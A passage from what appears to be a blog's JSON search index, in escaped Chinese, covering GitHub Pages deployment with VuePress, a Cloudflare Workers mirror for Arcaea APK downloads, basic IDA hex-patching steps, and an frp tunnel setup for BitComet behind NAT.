\u4f46\u662f\u5148\u4e0d\u8981\u63d0\u4ea4\uff0c\u8bbe\u7f6e\u597d\u5bc6\u94a5\u4e4b\u540e\u518d\u63d0\u4ea4\uff0c\u8fd9\u4e2a\u5bc6\u94a5\u662f\u63d0\u4f9b\u7ed9 vuepress-deploy \u5e94\u7528\u6765\u4f7f\u7528\u7684\u3002","title":"\u5728 GitHub \u4e0a\u521b\u5efa Actions \u4efb\u52a1"},{"location":"blog/2022/220408-github-pages-2/#_2","text":"\u8fd9\u4e00\u6b65\u5fc5\u4e0d\u53ef\u5c11\uff0c\u4e0d\u7136\u5373\u4f7f Actions \u53ef\u4ee5\u751f\u6210\uff0c\u4f46\u662f vuepress-deploy \u6ca1\u6cd5\u90e8\u7f72\u5230\u4f60\u7684 gh-pages \u5206\u652f\u91cc\u3002 \u770b\u8fd9\u4e2a \u6587\u6863 \u5c31\u884c\u3002 \u8bbe\u7f6e\u597d\u5bc6\u94a5\u4e4b\u540e\u5c31\u53ef\u4ee5\u63d0\u4ea4\u90a3\u4e2a yml \u6587\u4ef6\u4e86\u3002","title":"\u8bbe\u7f6e\u5bc6\u94a5"},{"location":"blog/2022/220408-github-pages-2/#_3","text":"\u8bbe\u7f6e\u5b8c\u8fd9\u4e9b\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u901a\u8fc7 push \u64cd\u4f5c\u89e6\u53d1 Actions \u6d41\u7a0b\u81ea\u52a8\u6784\u5efa\u6587\u6863\u4e86\u3002","title":"\u5b8c\u6210"},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/","tags":["cloudflare","cloudflare-workers","arcaea"],"text":"\u8f6c\u8f7d\u81ea Arcaea-Infinity/dl.arcaea.moe \uff08\u90e8\u7f72\u6587\u6863\u90e8\u5206\u662f\u672c\u4eba\u5199\u7684\uff0c\u800c js \u811a\u672c\u7531 TheSnowfield \u63d0\u4f9b\uff09 \u7b80\u4ecb \u00b6 \u8fd9\u662f\u4e00\u4e2a Arcaea \u955c\u50cf\u4e0b\u8f7d\u670d\u52a1\uff0c\u8be5\u670d\u52a1\u901a\u8fc7 Cloudflare Workers \u53cd\u5411\u4ee3\u7406\u5b9e\u73b0\uff0c\u672c\u8d28\u4e0a\u662f\u901a\u8fc7 Lowiro webapi \u83b7\u53d6\u6700\u65b0\u7684 APK \u6587\u4ef6 URL\uff0c\u7136\u540e\u901a\u8fc7\u8be5 URL \u4e0b\u8f7d\u6587\u4ef6\u3002 \u76ee\u524d\u8be5\u670d\u52a1\u5df2\u7ecf\u642d\u5efa\u5728\u4e86\uff1a https://dl.arcaea.moe https://dl.lcwiro.com \u4f60\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u7f51\u5740\u968f\u65f6\u4e0b\u8f7d\u6700\u65b0\u7684 arcaea_X.X.Xc.apk \u6587\u4ef6\u3002 \u90e8\u7f72 \u00b6 1. \u521b\u5efa\u4e00\u4e2a Cloudflare Workers \u5b9e\u4f8b \u00b6 \u8fdb\u5165 Cloudflare \u63a7\u5236\u53f0\uff0c\u70b9\u51fb Workers \u6807\u7b7e\u9875\uff0c\u7136\u540e\u70b9\u51fb Create a Service \u6309\u94ae\u3002 \u9009\u62e9 HTTP handler \uff0c\u7136\u540e\u70b9\u51fb Create service \u6309\u94ae\u3002 \u6b64\u65f6\u4f60\u7684\u670d\u52a1\u5df2\u7ecf\u642d\u5efa\u597d\u4e86\uff0c\u4f60\u5e94\u8be5\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u7c7b\u4f3c\u4e8e aaaaabbbbb.ccccc.workers.dev \u7684 URL\uff0c\u8fd9\u5c31\u662f\u4f60\u7684 Workers \u5b9e\u4f8b\u7684 URL\u3002 \u63d0\u793a \u4e00\u4e2a Workers \u5b9e\u4f8b\u4e5f\u53eb \u670d\u52a1 \uff0c\u4e0b\u6587\u4e00\u5f8b\u7b80\u79f0 \u670d\u52a1 \u3002 2. \u8bbe\u7f6e\u8be5\u670d\u52a1 \u00b6 \u5728\u4e0a\u4e00\u6b65\u64cd\u4f5c\u7684\u540c\u4e00\u4e2a\u9875\u9762\u5185\uff0c\u9009\u62e9 Resources \u6807\u7b7e\uff0c\u7136\u540e\u70b9\u51fb Quick edit \u6309\u94ae\u3002 \u4ece\u6211\u4eec\u7684 Repo \u4e0b\u8f7d\u5230 index.js \u7684\u4ee3\u7801 \uff0c\u76f4\u63a5\u590d\u5236\u5168\u6587\uff0c\u7136\u540e\u7c98\u8d34\u5230\u5982\u4e0b\u533a\u57df\uff0c\u8bb0\u5f97\u662f\u5168\u6587\u8986\u76d6\u3002 \u7136\u540e\u70b9\u51fb Save and Deploy \u6309\u94ae\u3002 \u6b64\u65f6\u4f60\u7684\u670d\u52a1\u5df2\u7ecf\u53ef\u4ee5\u6295\u5165\u4f7f\u7528\u4e86\u3002 3. \u6d4b\u8bd5\u670d\u52a1\u53ef\u7528\u6027 \u00b6 \u6253\u5f00\u4f60\u7684\u6d4f\u89c8\u5668\uff0c\u8f93\u5165\u4f60\u7684\u670d\u52a1\u7684 URL\uff0c\u5982 https://aaaaabbbbb.ccccc.workers.dev \uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u6b64\u65f6\u5e94\u8be5\u6b63\u786e\u5f00\u59cb\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\u7684 Arcaea\u3002 \u6ce8\u610f \u5982\u679c\u4f60\u53ea\u662f\u60f3\u90e8\u7f72\u5230 Cloudflare Workers\uff0c\u6b64\u65f6\u4f60\u9700\u8981\u505a\u7684\u4e8b\u60c5\u5df2\u7ecf\u505a\u5b8c\u4e86\u3002\u5982\u679c\u4f60\u60f3\u7ee7\u7eed\u5c06\u5176\u90e8\u7f72\u5230\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u4f60\u9700\u8981\u7ee7\u7eed\u770b\u4e0b\u53bb\u3002 4. \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684 DNS \u8bb0\u5f55 \u00b6 \u6253\u5f00\u4f60\u7684 DNS \u63a7\u5236\u53f0\uff0c\u6dfb\u52a0\u4e00\u4e2a CNAME \u8bb0\u5f55\u3002 \u6ce8\u610f\u4ee5\u4e0b\u503c\u7684\u586b\u5199\uff1a \u5b57\u6bb5 \u503c \u5907\u6ce8 Type CNAME Name dl \u4f60\u60f3\u90e8\u7f72\u5230\u54ea\u4e2a\u5b50\u57df\u5c31\u4f7f\u7528\u54ea\u4e2a\u503c Target aaaaabbbbb.ccccc.workers.dev \u4f7f\u7528\u4f60\u670d\u52a1\u6240\u5728\u7684 URL Proxy status Proxied \u5fc5\u987b\u662f Proxied \u7136\u540e\u70b9\u51fb Save \u6309\u94ae\u3002 5. \u5c06\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\u7684\u5b50\u57df\u8bbe\u7f6e\u4e3a\u8be5\u670d\u52a1\u7684\u8def\u7531: \u00b6 \u5728\u63a7\u5236\u53f0\u4e2d\u8fdb\u5165 Workers \u6807\u7b7e\u9875\u7136\u540e\u70b9\u51fb Add route \u6309\u94ae\u3002 \u6ce8\u610f \u8fd9\u91cc\u7684 Workers \u6807\u7b7e\u9875\u4e0d\u662f Cloudflare \u4e3b\u9875\u7684\u90a3\u4e2a\u6807\u7b7e\u9875\uff0c\u800c\u662f\u4f60\u70b9\u51fb\u4f60\u7684\u57df\u540d\u4e4b\u540e\u51fa\u73b0\u7684 Workers \u6807\u7b7e\u9875\u3002 \u6ce8\u610f\u4ee5\u4e0b\u503c\u7684\u586b\u5199\uff1a \u5b57\u6bb5 \u503c \u5907\u6ce8 Route dl.example.com/* \u5fc5\u987b\u662f \u4f60\u7684\u5b50\u57df + /* Service aaaaabbbbb \u4f7f\u7528\u4f60\u7684\u670d\u52a1\u7684\u540d\u5b57 \u7136\u540e\u70b9\u51fb Save \u6309\u94ae\u3002 6. \u6d4b\u8bd5\u7684\u4f60\u7684\u5b50\u57df \u00b6 \u73b0\u5728\u6253\u5f00\u4f60\u7684\u6d4f\u89c8\u5668\uff0c\u8f93\u5165\u4f60\u7684\u5b50\u57df\uff0c\u5982 https://dl.example.com/ \uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u6b64\u65f6\u5e94\u8be5\u6b63\u786e\u5f00\u59cb\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\u7684 Arcaea\u3002\uff0c \u8bb8\u53ef\u8bc1 \u00b6 \u672c\u6587\u6863\u9075\u5faa\u4ee5\u4e0b\u8bb8\u53ef\u8bc1\uff1a 616 SB License","title":"\u5982\u4f55\u4f7f\u7528 Cloudflare Workers \u6765\u642d\u5efa Arcaea \u955c\u50cf\u4e0b\u8f7d\u670d\u52a1\u5668"},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#_1","text":"\u8fd9\u662f\u4e00\u4e2a Arcaea \u955c\u50cf\u4e0b\u8f7d\u670d\u52a1\uff0c\u8be5\u670d\u52a1\u901a\u8fc7 Cloudflare Workers \u53cd\u5411\u4ee3\u7406\u5b9e\u73b0\uff0c\u672c\u8d28\u4e0a\u662f\u901a\u8fc7 Lowiro webapi \u83b7\u53d6\u6700\u65b0\u7684 APK \u6587\u4ef6 URL\uff0c\u7136\u540e\u901a\u8fc7\u8be5 URL \u4e0b\u8f7d\u6587\u4ef6\u3002 \u76ee\u524d\u8be5\u670d\u52a1\u5df2\u7ecf\u642d\u5efa\u5728\u4e86\uff1a https://dl.arcaea.moe https://dl.lcwiro.com \u4f60\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u7f51\u5740\u968f\u65f6\u4e0b\u8f7d\u6700\u65b0\u7684 arcaea_X.X.Xc.apk \u6587\u4ef6\u3002","title":"\u7b80\u4ecb"},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#_2","text":"","title":"\u90e8\u7f72"},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#1-cloudflare-workers","text":"\u8fdb\u5165 Cloudflare \u63a7\u5236\u53f0\uff0c\u70b9\u51fb Workers \u6807\u7b7e\u9875\uff0c\u7136\u540e\u70b9\u51fb Create a Service \u6309\u94ae\u3002 \u9009\u62e9 HTTP handler \uff0c\u7136\u540e\u70b9\u51fb Create service \u6309\u94ae\u3002 \u6b64\u65f6\u4f60\u7684\u670d\u52a1\u5df2\u7ecf\u642d\u5efa\u597d\u4e86\uff0c\u4f60\u5e94\u8be5\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u7c7b\u4f3c\u4e8e aaaaabbbbb.ccccc.workers.dev \u7684 URL\uff0c\u8fd9\u5c31\u662f\u4f60\u7684 Workers \u5b9e\u4f8b\u7684 URL\u3002 \u63d0\u793a \u4e00\u4e2a Workers \u5b9e\u4f8b\u4e5f\u53eb \u670d\u52a1 \uff0c\u4e0b\u6587\u4e00\u5f8b\u7b80\u79f0 \u670d\u52a1 \u3002","title":"1. \u521b\u5efa\u4e00\u4e2a Cloudflare Workers \u5b9e\u4f8b"},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#2","text":"\u5728\u4e0a\u4e00\u6b65\u64cd\u4f5c\u7684\u540c\u4e00\u4e2a\u9875\u9762\u5185\uff0c\u9009\u62e9 Resources \u6807\u7b7e\uff0c\u7136\u540e\u70b9\u51fb Quick edit \u6309\u94ae\u3002 \u4ece\u6211\u4eec\u7684 Repo \u4e0b\u8f7d\u5230 index.js \u7684\u4ee3\u7801 \uff0c\u76f4\u63a5\u590d\u5236\u5168\u6587\uff0c\u7136\u540e\u7c98\u8d34\u5230\u5982\u4e0b\u533a\u57df\uff0c\u8bb0\u5f97\u662f\u5168\u6587\u8986\u76d6\u3002 \u7136\u540e\u70b9\u51fb Save and Deploy \u6309\u94ae\u3002 \u6b64\u65f6\u4f60\u7684\u670d\u52a1\u5df2\u7ecf\u53ef\u4ee5\u6295\u5165\u4f7f\u7528\u4e86\u3002","title":"2. \u8bbe\u7f6e\u8be5\u670d\u52a1"},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#3","text":"\u6253\u5f00\u4f60\u7684\u6d4f\u89c8\u5668\uff0c\u8f93\u5165\u4f60\u7684\u670d\u52a1\u7684 URL\uff0c\u5982 https://aaaaabbbbb.ccccc.workers.dev \uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u6b64\u65f6\u5e94\u8be5\u6b63\u786e\u5f00\u59cb\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\u7684 Arcaea\u3002 \u6ce8\u610f \u5982\u679c\u4f60\u53ea\u662f\u60f3\u90e8\u7f72\u5230 Cloudflare Workers\uff0c\u6b64\u65f6\u4f60\u9700\u8981\u505a\u7684\u4e8b\u60c5\u5df2\u7ecf\u505a\u5b8c\u4e86\u3002\u5982\u679c\u4f60\u60f3\u7ee7\u7eed\u5c06\u5176\u90e8\u7f72\u5230\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u4f60\u9700\u8981\u7ee7\u7eed\u770b\u4e0b\u53bb\u3002","title":"3. \u6d4b\u8bd5\u670d\u52a1\u53ef\u7528\u6027"},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#4-dns","text":"\u6253\u5f00\u4f60\u7684 DNS \u63a7\u5236\u53f0\uff0c\u6dfb\u52a0\u4e00\u4e2a CNAME \u8bb0\u5f55\u3002 \u6ce8\u610f\u4ee5\u4e0b\u503c\u7684\u586b\u5199\uff1a \u5b57\u6bb5 \u503c \u5907\u6ce8 Type CNAME Name dl \u4f60\u60f3\u90e8\u7f72\u5230\u54ea\u4e2a\u5b50\u57df\u5c31\u4f7f\u7528\u54ea\u4e2a\u503c Target aaaaabbbbb.ccccc.workers.dev \u4f7f\u7528\u4f60\u670d\u52a1\u6240\u5728\u7684 URL Proxy status Proxied \u5fc5\u987b\u662f Proxied \u7136\u540e\u70b9\u51fb Save \u6309\u94ae\u3002","title":"4. \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684 DNS \u8bb0\u5f55"},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#5","text":"\u5728\u63a7\u5236\u53f0\u4e2d\u8fdb\u5165 Workers \u6807\u7b7e\u9875\u7136\u540e\u70b9\u51fb Add route \u6309\u94ae\u3002 \u6ce8\u610f \u8fd9\u91cc\u7684 Workers \u6807\u7b7e\u9875\u4e0d\u662f Cloudflare \u4e3b\u9875\u7684\u90a3\u4e2a\u6807\u7b7e\u9875\uff0c\u800c\u662f\u4f60\u70b9\u51fb\u4f60\u7684\u57df\u540d\u4e4b\u540e\u51fa\u73b0\u7684 Workers \u6807\u7b7e\u9875\u3002 \u6ce8\u610f\u4ee5\u4e0b\u503c\u7684\u586b\u5199\uff1a \u5b57\u6bb5 \u503c \u5907\u6ce8 Route dl.example.com/* \u5fc5\u987b\u662f \u4f60\u7684\u5b50\u57df + /* Service aaaaabbbbb \u4f7f\u7528\u4f60\u7684\u670d\u52a1\u7684\u540d\u5b57 \u7136\u540e\u70b9\u51fb Save \u6309\u94ae\u3002","title":"5. \u5c06\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\u7684\u5b50\u57df\u8bbe\u7f6e\u4e3a\u8be5\u670d\u52a1\u7684\u8def\u7531:"},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#6","text":"\u73b0\u5728\u6253\u5f00\u4f60\u7684\u6d4f\u89c8\u5668\uff0c\u8f93\u5165\u4f60\u7684\u5b50\u57df\uff0c\u5982 https://dl.example.com/ \uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u6b64\u65f6\u5e94\u8be5\u6b63\u786e\u5f00\u59cb\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\u7684 Arcaea\u3002\uff0c","title":"6. \u6d4b\u8bd5\u7684\u4f60\u7684\u5b50\u57df"},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#_3","text":"\u672c\u6587\u6863\u9075\u5faa\u4ee5\u4e0b\u8bb8\u53ef\u8bc1\uff1a 616 SB License","title":"\u8bb8\u53ef\u8bc1"},{"location":"blog/2022/220412-ida-substitute-usage/","tags":["ida"],"text":"\u6700\u8fd1\u5728\u4fee\u6539\u67d0\u4e2a\ud83c\uddec\ud83c\udde7\u6e38\u620f\uff0c\u6d89\u53ca\u5230\u4e00\u4e9b IDA \u5728\u66ff\u6362\u65b9\u9762\u7684\u4f7f\u7528\uff0c\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e0b\uff0c\u514d\u5f97\u6bcf\u6b21\u90fd\u53bb\u9ebb\u70e6\u7fa4\u53cb\u95ee IDA \u600e\u4e48\u7528\u3002 \u6587\u672c\u641c\u7d22 \u00b6 graph LR A[Search] --> B[text]; \u8f93\u5165\u60f3\u8981\u641c\u7d22\u7684\u6587\u672c\u5373\u53ef\u3002 \u641c\u7d22\u5b57\u8282\uff08\u5341\u516d\u8fdb\u5236\u3001\u5341\u8fdb\u5236\u548c\u516b\u8fdb\u5236\uff09 \u00b6 graph LR A[Search] --> B[sequence of bytes]; \u7136\u540e\u9009\u62e9 Hex \u3001 Decimal \u6216 Octal \uff0c\u8f93\u5165\u4f60\u9700\u8981\u641c\u7d22\u7684\u5b57\u8282\uff0c\u6bcf\u4e2a\u5b57\u8282\u4f7f\u7528\u7a7a\u683c\u5206\u9694\u3002 Hex \u66ff\u6362 \u00b6 \u9996\u5148\u5728 IDA View \u9009\u9879\u5361\u4e2d\u9009\u62e9\u5230\u4f60\u60f3\u8981\u66ff\u6362\u7684\u5185\u5bb9\u6240\u5728\u7684\u5b57\u8282\uff08\u4ee5\u5b57\u7b26\u4e32\u4e3a\u4f8b\uff09\uff0c\u7136\u540e\u5207\u6362\u5230 Hex View \u9009\u9879\u5361\uff08\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\uff09\u3002\u9009\u62e9\u4e00\u4e2a\u5b57\u8282\uff0c\u4f60\u63a5\u4e0b\u6765\u8981\u4f1a\u4ece\u8fd9\u91cc\u5f00\u59cb\u7f16\u8f91\u3002 \u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u9009\u9879\u5361 graph LR A[View] --> B; B[Open subviews] --> C[Hex dump]; \u4ece\u8fd9\u91cc\u6253\u5f00 Hex View \u9009\u9879\u5361\u3002 \u6709\u4e24\u79cd\u65b9\u5f0f\u53ef\u4ee5\u7f16\u8f91\uff1a \u5728\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u4e2d\u53f3\u952e\u9009\u62e9 Edit \uff08\u6216\u8005\u6309 F2 \uff09\uff0c\u7136\u540e\u76f4\u63a5\u7f16\u8f91\u5341\u516d\u8fdb\u5236\u6216\u8005\u76f4\u63a5\u7f16\u8f91\u6587\u672c\u5185\u5bb9\uff0c\u7f16\u8f91\u5b8c\u6210\u540e\u53f3\u952e\u9009\u62e9 Apply Changes \uff08\u6216\u8005\u6309 F2 \uff09\u3002 \u9009\u62e9 Edit -> Patch Program -> Change Byte.. \uff0c\u5728\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\u4e2d\u5bf9\u5e94\u586b\u5199\u4f60\u8981\u66ff\u6362\u7684\u5341\u516d\u8fdb\u5236\u503c\uff08\u4e00\u6b21\u6027\u66ff\u636216\u4e2a\u5b57\u8282\uff09\uff0c\u7136\u540e\u70b9 OK \u3002 \u641c\u7d22\u5b57\u7b26\u4e32 \u00b6 graph LR A[View] --> B; B[Open subviews] --> C[Strings]; \u5728\u51fa\u6765\u7684\u5b57\u7b26\u4e32\u5217\u8868\u4e2d\u76f4\u63a5\u4f7f\u7528 Ctrl+F \u641c\u7d22\u5373\u53ef\u3002 \u751f\u6210\u4f2a\u4ee3\u7801 \u00b6 \u5728 IDA View \u9009\u9879\u5361\u4e2d\u9009\u62e9\u5230\u4f60\u751f\u6210\u7684\u51fd\u6570\uff0c\u6309 F5 \u751f\u6210\u4f2a\u4ee3\u7801\u3002 \u4fdd\u5b58\u4e8c\u8fdb\u5236\u6587\u4ef6 \u00b6 graph LR A[Edit] --> B; B[Patch Program] --> C[Apply patches to input file..]; \u4ece\u8fd9\u91cc\u4fdd\u5b58\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002","title":"IDA \u66ff\u6362\u4e8c\u8fdb\u5236\u6587\u4ef6"},{"location":"blog/2022/220412-ida-substitute-usage/#_1","text":"graph LR A[Search] --> B[text]; \u8f93\u5165\u60f3\u8981\u641c\u7d22\u7684\u6587\u672c\u5373\u53ef\u3002","title":"\u6587\u672c\u641c\u7d22"},{"location":"blog/2022/220412-ida-substitute-usage/#_2","text":"graph LR A[Search] --> B[sequence of bytes]; \u7136\u540e\u9009\u62e9 Hex \u3001 Decimal \u6216 Octal \uff0c\u8f93\u5165\u4f60\u9700\u8981\u641c\u7d22\u7684\u5b57\u8282\uff0c\u6bcf\u4e2a\u5b57\u8282\u4f7f\u7528\u7a7a\u683c\u5206\u9694\u3002","title":"\u641c\u7d22\u5b57\u8282\uff08\u5341\u516d\u8fdb\u5236\u3001\u5341\u8fdb\u5236\u548c\u516b\u8fdb\u5236\uff09"},{"location":"blog/2022/220412-ida-substitute-usage/#hex","text":"\u9996\u5148\u5728 IDA View \u9009\u9879\u5361\u4e2d\u9009\u62e9\u5230\u4f60\u60f3\u8981\u66ff\u6362\u7684\u5185\u5bb9\u6240\u5728\u7684\u5b57\u8282\uff08\u4ee5\u5b57\u7b26\u4e32\u4e3a\u4f8b\uff09\uff0c\u7136\u540e\u5207\u6362\u5230 Hex View \u9009\u9879\u5361\uff08\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\uff09\u3002\u9009\u62e9\u4e00\u4e2a\u5b57\u8282\uff0c\u4f60\u63a5\u4e0b\u6765\u8981\u4f1a\u4ece\u8fd9\u91cc\u5f00\u59cb\u7f16\u8f91\u3002 \u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u9009\u9879\u5361 graph LR A[View] --> B; B[Open subviews] --> C[Hex dump]; \u4ece\u8fd9\u91cc\u6253\u5f00 Hex View \u9009\u9879\u5361\u3002 \u6709\u4e24\u79cd\u65b9\u5f0f\u53ef\u4ee5\u7f16\u8f91\uff1a \u5728\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u4e2d\u53f3\u952e\u9009\u62e9 Edit \uff08\u6216\u8005\u6309 F2 \uff09\uff0c\u7136\u540e\u76f4\u63a5\u7f16\u8f91\u5341\u516d\u8fdb\u5236\u6216\u8005\u76f4\u63a5\u7f16\u8f91\u6587\u672c\u5185\u5bb9\uff0c\u7f16\u8f91\u5b8c\u6210\u540e\u53f3\u952e\u9009\u62e9 Apply Changes \uff08\u6216\u8005\u6309 F2 \uff09\u3002 \u9009\u62e9 Edit -> Patch Program -> Change Byte.. \uff0c\u5728\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\u4e2d\u5bf9\u5e94\u586b\u5199\u4f60\u8981\u66ff\u6362\u7684\u5341\u516d\u8fdb\u5236\u503c\uff08\u4e00\u6b21\u6027\u66ff\u636216\u4e2a\u5b57\u8282\uff09\uff0c\u7136\u540e\u70b9 OK \u3002","title":"Hex \u66ff\u6362"},{"location":"blog/2022/220412-ida-substitute-usage/#_3","text":"graph LR A[View] --> B; B[Open subviews] --> C[Strings]; \u5728\u51fa\u6765\u7684\u5b57\u7b26\u4e32\u5217\u8868\u4e2d\u76f4\u63a5\u4f7f\u7528 Ctrl+F \u641c\u7d22\u5373\u53ef\u3002","title":"\u641c\u7d22\u5b57\u7b26\u4e32"},{"location":"blog/2022/220412-ida-substitute-usage/#_4","text":"\u5728 IDA View \u9009\u9879\u5361\u4e2d\u9009\u62e9\u5230\u4f60\u751f\u6210\u7684\u51fd\u6570\uff0c\u6309 F5 \u751f\u6210\u4f2a\u4ee3\u7801\u3002","title":"\u751f\u6210\u4f2a\u4ee3\u7801"},{"location":"blog/2022/220412-ida-substitute-usage/#_5","text":"graph LR A[Edit] --> B; B[Patch Program] --> C[Apply patches to input file..]; \u4ece\u8fd9\u91cc\u4fdd\u5b58\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002","title":"\u4fdd\u5b58\u4e8c\u8fdb\u5236\u6587\u4ef6"},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/","tags":["frp","bitcomit","proxy"],"text":"\u80cc\u666f \u00b6 \u60f3\u7528\u6bd4\u7279\u5f57\u661f\u4e0b\u79cd\u5b50\uff0c\u4f46\u662f\u56e0\u4e3a\u8eab\u5904\u6570\u4e2a NAT \u8eab\u540e\uff0c\u6839\u672c\u6ca1\u6709\u516c\u7f51 IP\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8ba9\u522b\u7684 peer \u8fde\u63a5\u5230\u4f60\uff0c\u4e0b\u8f7d\u901f\u5ea6\u582a\u5fe7\u3002 \u6ca1\u6709\u516c\u7f51 IP \u600e\u4e48\u529e\uff1f\u6253\u7535\u8bdd\u95ee\u8fd0\u8425\u5546\uff1f\u8fd8\u662f\u7b97\u4e86\u5427\uff0c\u5e72\u8106\u5411\u81ea\u5df1 VPS \u501f\u4e00\u4e2a\u3002 \u524d\u63d0\u6761\u4ef6 \u00b6 \u4e00\u53f0\u6709\u516c\u7f51 IP \u7684\u673a\u5668\uff08\u6700\u597d\u662f\u56fa\u5b9a\u7684 IP\uff09 \u8fd9\u53f0\u673a\u5668\u88ab\u5141\u8bb8\u642d\u5efa frp \u7b49\u5185\u7f51\u7a7f\u900f\u670d\u52a1 \u8fd9\u53f0\u673a\u5668\u88ab\u5141\u8bb8\u642d\u5efa\u4ee3\u7406\u670d\u52a1 \u64cd\u4f5c \u00b6 \u90e8\u7f72 frps \u00b6 \u9996\u5148\u5728\u6709\u516c\u7f51 IP \u7684\u90a3\u53f0\u673a\u5668\u4e0a\u90e8\u7f72 frp \u670d\u52a1\u7aef\u3002 \u53bb release \u4e0b\u8f7d\u5bf9\u5e94\u7cfb\u7edf\u7684 frp\uff0c\u4e0b\u8f7d\u4e4b\u540e\u89e3\u538b\uff0c\u91cc\u9762\u7684 frps \u5c31\u662f\u6211\u4eec\u9700\u8981\u7684 frp \u670d\u52a1\u7aef\u3002 \u5199 frps.ini \uff1a frps.ini 1 2 3 4 5 6 7 [common] bind_port = 7000 bind_udp_port = 7000 bind_addr = 0.0.0.0 allow_ports = 1001-1500,10001-22500 token = \u4f60\u7684\u5bc6\u7801 tls_only = true \u6ce8\u610f\u4ee5\u4e0b\u914d\u7f6e\u9879\uff1a allow_ports \u662f\u6307\u7ecf\u8fc7 frp \u4ee3\u7406/\u8f6c\u53d1\u7684\u8fde\u63a5\u53ef\u4ee5\u4f7f\u7528\u7684\u7aef\u53e3\u8303\u56f4\u3002 token \u8bf7\u81ea\u5df1\u968f\u4fbf\u8bbe\u7f6e\u4e00\u4e2a\u3002 tls_only \u5219\u8981\u6c42\u6240\u6709\u7684 frpc \u5ba2\u6237\u7aef\uff08\u662f\u4f60\uff0c\u4e0d\u662f\u6307\u90a3\u4e9b peers\uff09\u4e5f\u542f\u7528 TLS \u624d\u80fd\u8fde\u63a5\u3002\u5efa\u8bae\u8bbe\u7f6e\u6210 true \u3002 \u5176\u4ed6\u7684\u53c2\u6570\u53ef\u4ee5\u901a\u8fc7 \u5b98\u7f51\u6587\u6863 \u67e5\u770b\u3002 \u7136\u540e\u901a\u8fc7 frps.exe -c frps.ini \u542f\u7528 frps \u670d\u52a1\u7aef\u3002 \u6b64\u65f6\u4f60\u7684\u670d\u52a1\u7aef\u4e0a\u5e94\u8be5\u663e\u793a\u5982\u4e0b\u65e5\u5fd7\uff1a 2022/04/13 09:42:18 [I] [root.go:200] frps uses config file: frps.ini 2022/04/13 09:42:18 [I] [service.go:192] frps tcp listen on 0.0.0.0:7000 2022/04/13 09:42:18 [I] [service.go:276] nat hole udp service listen on 0.0.0.0:7000 2022/04/13 09:42:18 [I] [root.go:209] frps started successfully \u8bf4\u660e\u4f60\u7684\u670d\u52a1\u7aef\u6b63\u5728\u76d1\u542c\u6240\u6709\u6765\u81ea 7000 \u7aef\u53e3\u7684 frp \u8fde\u63a5\u3002 \u90e8\u7f72 frpc \u00b6 \u5728\u81ea\u5df1\u9700\u8981\u8fd0\u884c\u6bd4\u7279\u5f57\u661f\u7684\u7535\u8111\u4e0a\u90e8\u7f72 frp \u5ba2\u6237\u7aef\u3002 \u540c\u6837\uff0c\u53bb\u4e0b\u8f7d\u5bf9\u5e94\u7cfb\u7edf\u7248\u672c\u7684 frp\uff0c\u89e3\u538b\u83b7\u53d6 frpc\u3002 \u5199 frpc.ini \uff1a frpc.ini 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 [common] server_addr = \u7ed9\u5b9a\u7684IPv4\u5730\u5740/IPv6\u5730\u5740/\u57df\u540d server_port = 7000 protocol = websocket token = \u4f60\u7684\u5bc6\u7801 tls_enable = true [Remote Download] type = tcp local_ip = 127.0.0.1 local_port = 2333 remote_port = 2333 [BT Listen TCP] type = tcp local_ip = 127.0.0.1 local_port = 10400 remote_port = 10400 [BT Listen UDP] type = udp local_ip = 127.0.0.1 local_port = 10400 remote_port = 10400 [eMule Listen TCP] type = tcp local_ip = 127.0.0.1 local_port = 22224 remote_port = 22224 [eMule Listen UDP] type = udp local_ip = 127.0.0.1 local_port = 22224 remote_port = 22224 \u6ce8\u610f\u4ee5\u4e0b\u914d\u7f6e\u9879\uff1a server_addr \u8bbe\u7f6e\u6210\u90a3\u53f0\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u7684 IP \u5730\u5740\uff0c\u53ef\u4ee5\u662f IPv4/IPv6/\u57df\u540d\u3002\u8bbe\u7f6e\u6210 IPv6 